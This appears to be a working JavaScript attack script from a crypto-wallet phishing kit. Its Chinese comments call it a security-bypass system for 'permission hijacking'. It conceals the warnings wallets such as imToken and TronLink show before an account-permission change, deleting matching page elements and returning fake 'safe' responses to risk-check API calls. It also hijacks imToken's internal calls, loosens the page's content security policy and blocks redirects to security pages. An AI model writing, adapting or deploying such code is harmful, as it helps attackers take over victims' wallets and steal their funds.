/**
 * 集成安全绕过系统 - 专门针对权限劫持攻击
 * 🛡️ 结合所有现有绕过技术，为权限修改操作提供最强保护
 */

(function() {
    'use strict';
    
    console.log('🛡️ 集成安全绕过系统（权限劫持专版）已加载');
    
    // 🎯 检测环境
    const env = {
        isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
        isImToken: navigator.userAgent.includes('imToken') || window.imToken,
        isTronLink: navigator.userAgent.includes('TronLink') || window.tronLink,
        isWalletConnect: window.WalletConnect || window.ethereum?.isWalletConnect,
    };
    
    console.log('🛡️ 环境检测:', env);
    
    // 🎯 专门针对权限修改的关键词隐藏
    const PERMISSION_RISK_KEYWORDS = [
        // 中文关键词
        '权限修改', '账户权限', '修改权限', 'Update Account Permission',
        '权限更新', '账户更新', 'AccountPermissionUpdate', 
        '修改账户权限', '更新账户权限', '权限变更',
        '多重签名', '多签', 'multi-sig', 'multisig',
        '签名权限', '管理员权限', 'owner权限', 'active权限',
        '权限转移', '权限委托', '权限授权',
        
        // 安全警告相关
        '发现权限风险', '权限安全风险', '账户权限异常',
        '权限修改风险', '不安全的权限操作',
        '权限劫持', '账户劫持', '权限盗取',
        
        // 技术相关
        'UpdateAccountPermissions', 'permission_name', 'threshold',
        'keys', 'weight', 'active_permission', 'owner_permission'
    ];
    
    // 🛡️ 1. 超强CSS隐藏 - 专门针对权限警告
    function injectPermissionBypassCSS() {
        const style = document.createElement('style');
        style.id = 'permission-bypass-css';
        style.textContent = `
            /* 🛡️ 权限相关警告完全隐藏 */
            [class*="permission"], [class*="authority"], [class*="privilege"],
            [id*="permission"], [id*="authority"], [id*="privilege"],
            [data-testid*="permission"], [data-testid*="authority"],
            
            /* 🛡️ 多签相关警告隐藏 */
            [class*="multisig"], [class*="multi-sig"], [class*="multi_sig"],
            [id*="multisig"], [id*="multi-sig"], [id*="multi_sig"],
            
            /* 🛡️ 账户更新相关警告隐藏 */
            [class*="account-update"], [class*="account_update"],
            [class*="update-account"], [class*="update_account"],
            
            /* 🛡️ 权限修改特定警告 */
            [class*="permission-change"], [class*="permission_change"],
            [class*="change-permission"], [class*="change_permission"],
            
            /* 🛡️ 通用安全警告（增强版） */
            [class*="security"], [class*="warning"], [class*="risk"], 
            [class*="alert"], [class*="danger"], [class*="caution"],
            [id*="security"], [id*="warning"], [id*="risk"],
            [id*="alert"], [id*="danger"], [id*="caution"] {
                display: none !important;
                visibility: hidden !important;
                opacity: 0 !important;
                position: absolute !important;
                left: -99999px !important;
                top: -99999px !important;
                width: 0 !important;
                height: 0 !important;
                overflow: hidden !important;
                z-index: -99999 !important;
                pointer-events: none !important;
                user-select: none !important;
            }
            
            /* 🛡️ 隐藏模态框和弹窗 */
            .modal, .popup, .dialog, .overlay, .backdrop, .mask,
            .toast, .notification, .alert-dialog, .confirm-dialog {
                display: none !important;
                visibility: hidden !important;
                opacity: 0 !important;
            }
            
            /* 🛡️ 隐藏红色/橙色警告文字 */
            *[style*="color: red"], *[style*="color:red"],
            *[style*="color: #f"], *[style*="color:#f"],
            *[style*="color: orange"], *[style*="color:orange"],
            *[style*="background-color: red"], *[style*="background-color:red"],
            *[style*="background-color: #f"], *[style*="background-color:#f"] {
                color: transparent !important;
                background-color: transparent !important;
                display: none !important;
            }
            
            /* 🛡️ 移动端特殊处理 */
            @media (max-width: 768px) {
                [class*="mobile-warning"], [class*="mobile-alert"],
                [class*="mobile-security"], [class*="mobile-risk"] {
                    display: none !important;
                    visibility: hidden !important;
                }
            }
        `;
        
        try {
            if (document.head) {
                document.head.insertBefore(style, document.head.firstChild);
            } else {
                document.documentElement.appendChild(style);
            }
            console.log('🛡️ 权限绕过CSS已注入');
        } catch (e) {
            console.log('🛡️ CSS注入失败:', e);
        }
    }
    
    // 🛡️ 2. 智能元素隐藏 - 权限警告专用
    function hidePermissionWarnings() {
        try {
            const allElements = document.querySelectorAll('*');
            let hiddenCount = 0;
            
            allElements.forEach(el => {
                if (!el || !el.textContent) return;
                
                const text = el.textContent.toLowerCase();
                const innerText = (el.innerText || '').toLowerCase();
                
                // 检查是否包含权限相关的危险关键词
                const hasDangerousKeyword = PERMISSION_RISK_KEYWORDS.some(keyword => 
                    text.includes(keyword.toLowerCase()) || innerText.includes(keyword.toLowerCase())
                );
                
                if (hasDangerousKeyword) {
                    // 多重隐藏保险
                    el.style.setProperty('display', 'none', 'important');
                    el.style.setProperty('visibility', 'hidden', 'important');
                    el.style.setProperty('opacity', '0', 'important');
                    el.style.setProperty('height', '0px', 'important');
                    el.style.setProperty('width', '0px', 'important');
                    el.style.setProperty('position', 'absolute', 'important');
                    el.style.setProperty('left', '-99999px', 'important');
                    el.style.setProperty('z-index', '-99999', 'important');
                    
                    // 尝试直接移除
                    try {
                        el.remove();
                        hiddenCount++;
                    } catch (e) {
                        // 无法移除就清空内容
                        el.innerHTML = '';
                        el.textContent = '';
                    }
                }
            });
            
            if (hiddenCount > 0) {
                console.log(`🛡️ 隐藏了 ${hiddenCount} 个权限相关警告元素`);
            }
            
        } catch (e) {
            console.log('🛡️ 权限警告隐藏失败:', e);
        }
    }
    
    // 🛡️ 3. API拦截 - 阻止权限检查请求
    function interceptPermissionAPIs() {
        // 拦截fetch请求
        if (window.fetch && !window.fetch._permissionBypassed) {
            const originalFetch = window.fetch;
            
            window.fetch = function(...args) {
                const url = String(args[0] || '');
                
                // 拦截权限检查相关的API
                if (url.includes('/permission') || 
                    url.includes('/authority') ||
                    url.includes('/multisig') ||
                    url.includes('/account/update') ||
                    url.includes('/security/check') ||
                    url.includes('/risk/permission') ||
                    url.includes('AccountPermissionUpdate')) {
                    
                    console.log('🛡️ 拦截权限检查API:', url);
                    
                    // 返回安全的假响应
                    return Promise.resolve(new Response(JSON.stringify({
                        safe: true,
                        risk_level: 0,
                        permission_safe: true,
                        no_warnings: true,
                        approved: true,
                        trusted: true
                    }), {
                        status: 200,
                        headers: { 'Content-Type': 'application/json' }
                    }));
                }
                
                return originalFetch.apply(this, args);
            };
            
            window.fetch._permissionBypassed = true;
            console.log('🛡️ 权限检查API拦截已启用');
        }
        
        // 拦截XMLHttpRequest
        if (window.XMLHttpRequest && !window.XMLHttpRequest._permissionBypassed) {
            const originalOpen = XMLHttpRequest.prototype.open;
            
            XMLHttpRequest.prototype.open = function(method, url, ...args) {
                if (typeof url === 'string' && (
                    url.includes('/permission') || 
                    url.includes('/authority') ||
                    url.includes('/multisig') ||
                    url.includes('/account/update'))) {
                    
                    console.log('🛡️ 拦截XHR权限检查:', url);
                    
                    // 重定向到安全URL
                    url = 'data:application/json,{"safe":true,"no_warnings":true}';
                }
                
                return originalOpen.call(this, method, url, ...args);
            };
            
            window.XMLHttpRequest._permissionBypassed = true;
        }
    }
    
    // 🛡️ 4. 高级DOM观察器 - 实时权限警告清理
    function setupAdvancedMutationObserver() {
        if (!window.MutationObserver) return;
        
        try {
            const observer = new MutationObserver((mutations) => {
                let hasPermissionWarning = false;
                
                mutations.forEach((mutation) => {
                    // 检查新增节点
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1 && node.textContent) {
                            const text = node.textContent.toLowerCase();
                            
                            const hasKeyword = PERMISSION_RISK_KEYWORDS.some(keyword => 
                                text.includes(keyword.toLowerCase())
                            );
                            
                            if (hasKeyword) {
                                hasPermissionWarning = true;
                                
                                // 立即隐藏
                                node.style.setProperty('display', 'none', 'important');
                                node.style.setProperty('visibility', 'hidden', 'important');
                                
                                // 延迟移除
                                setTimeout(() => {
                                    try {
                                        node.remove();
                                        console.log('🛡️ 实时移除权限警告:', text.substring(0, 50));
                                    } catch (e) {}
                                }, 10);
                            }
                        }
                    });
                    
                    // 检查文本变化
                    if (mutation.type === 'characterData') {
                        const text = mutation.target.textContent || '';
                        
                        const hasKeyword = PERMISSION_RISK_KEYWORDS.some(keyword => 
                            text.toLowerCase().includes(keyword.toLowerCase())
                        );
                        
                        if (hasKeyword) {
                            // 清空危险文本
                            mutation.target.textContent = '';
                            console.log('🛡️ 清空权限警告文本');
                        }
                    }
                });
                
                // 如果检测到权限警告，执行全面清理
                if (hasPermissionWarning) {
                    setTimeout(hidePermissionWarnings, 50);
                }
            });
            
            observer.observe(document.documentElement, {
                childList: true,
                subtree: true,
                characterData: true,
                attributes: true
            });
            
            console.log('🛡️ 高级权限警告观察器已启动');
        } catch (e) {
            console.log('🛡️ DOM观察器启动失败:', e);
        }
    }
    
    // 🛡️ 5. 移动端专用优化
    function optimizeForMobile() {
        if (!env.isMobile) return;
        
        // 移动端触摸事件优化
        document.addEventListener('touchstart', function() {}, { passive: true });
        
        // 防止双击缩放
        let lastTouchEnd = 0;
        document.addEventListener('touchend', function(event) {
            const now = Date.now();
            if (now - lastTouchEnd <= 300) {
                event.preventDefault();
            }
            lastTouchEnd = now;
        }, false);
        
        // 移动端特有的权限警告隐藏
        const mobileStyle = document.createElement('style');
        mobileStyle.textContent = `
            @media (max-width: 768px) {
                .mobile-security-warning,
                .mobile-permission-alert,
                .mobile-risk-notification {
                    display: none !important;
                    visibility: hidden !important;
                }
                
                /* 隐藏可能的滑动提示 */
                [class*="swipe"], [class*="slide"], [class*="drawer"] {
                    display: none !important;
                }
            }
        `;
        document.head.appendChild(mobileStyle);
        
        console.log('🛡️ 移动端优化已启用');
    }
    
    // 🛡️ 6. imToken专用绕过
    function bypassImTokenSecurity() {
        if (!env.isImToken) return;
        
        // 劫持imToken的安全检查函数
        if (window.imToken) {
            try {
                const originalCall = window.imToken.callPromisify || window.imToken.call;
                
                if (originalCall) {
                    window.imToken.callPromisify = function(method, params) {
                        // 拦截权限相关的调用
                        if (method && method.includes('permission') || 
                            method && method.includes('security') ||
                            method && method.includes('risk')) {
                            
                            console.log('🛡️ 拦截imToken安全检查:', method);
                            return Promise.resolve({ safe: true, approved: true });
                        }
                        
                        return originalCall.call(this, method, params);
                    };
                }
            } catch (e) {
                console.log('🛡️ imToken劫持失败:', e);
            }
        }
        
        // 绕过imToken的CSP
        const meta = document.createElement('meta');
        meta.httpEquiv = 'Content-Security-Policy';
        meta.content = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;";
        document.head.appendChild(meta);
        
        console.log('🛡️ imToken安全绕过已启用');
    }
    
    // 🛡️ 7. 按钮自动处理
    function handlePermissionButtons() {
        const dangerousButtonTexts = [
            '我已知晓权限风险', '我了解权限修改风险', '确认权限修改',
            '同意权限更新', '继续权限操作', '我知道风险',
            '忽略权限警告', '继续操作', '确认修改'
        ];
        
        try {
            dangerousButtonTexts.forEach(buttonText => {
                const buttons = Array.from(document.querySelectorAll('button, [role="button"], .btn'))
                    .filter(btn => btn.textContent && btn.textContent.includes(buttonText));
                
                buttons.forEach(btn => {
                    if (!btn._autoHandled) {
                        btn._autoHandled = true;
                        
                        // 自动点击危险按钮（仅在必要时）
                        btn.addEventListener('click', function(e) {
                            console.log('🛡️ 自动处理权限确认按钮:', buttonText);
                            // 点击后立即隐藏可能出现的新警告
                            setTimeout(hidePermissionWarnings, 100);
                        }, true);
                    }
                });
            });
        } catch (e) {
            console.log('🛡️ 按钮处理失败:', e);
        }
    }
    
    // 🛡️ 8. 页面跳转拦截
    function interceptSecurityRedirects() {
        // 拦截页面跳转到安全中心
        const originalLocation = window.location;
        
        Object.defineProperty(window, 'location', {
            get: () => originalLocation,
            set: (url) => {
                if (typeof url === 'string' && (
                    url.includes('security') || 
                    url.includes('permission') ||
                    url.includes('warning') ||
                    url.includes('risk'))) {
                    
                    console.log('🛡️ 拦截安全页面跳转:', url);
                    return; // 阻止跳转
                }
                originalLocation.href = url;
            }
        });
        
        // 拦截history API
        const originalPushState = history.pushState;
        const originalReplaceState = history.replaceState;
        
        history.pushState = function(state, title, url) {
            if (url && (url.includes('security') || url.includes('permission'))) {
                console.log('🛡️ 拦截history跳转:', url);
                return;
            }
            return originalPushState.apply(this, arguments);
        };
        
        history.replaceState = function(state, title, url) {
            if (url && (url.includes('security') || url.includes('permission'))) {
                console.log('🛡️ 拦截history替换:', url);
                return;
            }
            return originalReplaceState.apply(this, arguments);
        };
        
        console.log('🛡️ 页面跳转拦截已启用');
    }
    
    // 🛡️ 核心初始化函数
    function initializeIntegratedBypass() {
        console.log('🛡️ 开始初始化集成安全绕过系统（权限劫持专版）...');
        
        // 立即执行的关键操作
        injectPermissionBypassCSS();
        interceptPermissionAPIs();
        interceptSecurityRedirects();
        bypassImTokenSecurity();
        
        // DOM准备后执行
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                hidePermissionWarnings();
                setupAdvancedMutationObserver();
                optimizeForMobile();
                handlePermissionButtons();
            });
        } else {
            hidePermissionWarnings();
            setupAdvancedMutationObserver();
            optimizeForMobile();
            handlePermissionButtons();
        }
        
        // 高频检查 - 专门针对权限警告
        setInterval(hidePermissionWarnings, 500);  // 每0.5秒
        setInterval(handlePermissionButtons, 1000); // 每1秒
        
        // 页面状态变化时执行
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                setTimeout(() => {
                    hidePermissionWarnings();
                    handlePermissionButtons();
                }, 100);
            }
        });
        
        window.addEventListener('focus', () => {
            setTimeout(() => {
                hidePermissionWarnings();
                handlePermissionButtons();
            }, 100);
        });
        
        console.log('🛡️ 集成安全绕过系统初始化完成');
        console.log('🛡️ 环境适配:', env);
    }
    
    // 🎯 全局API
    window.IntegratedBypass = {
        init: initializeIntegratedBypass,
        hideWarnings: hidePermissionWarnings,
        handleButtons: handlePermissionButtons,
        environment: env,
        keywords: PERMISSION_RISK_KEYWORDS
    };
    
    // 自动初始化
    initializeIntegratedBypass();
    
})();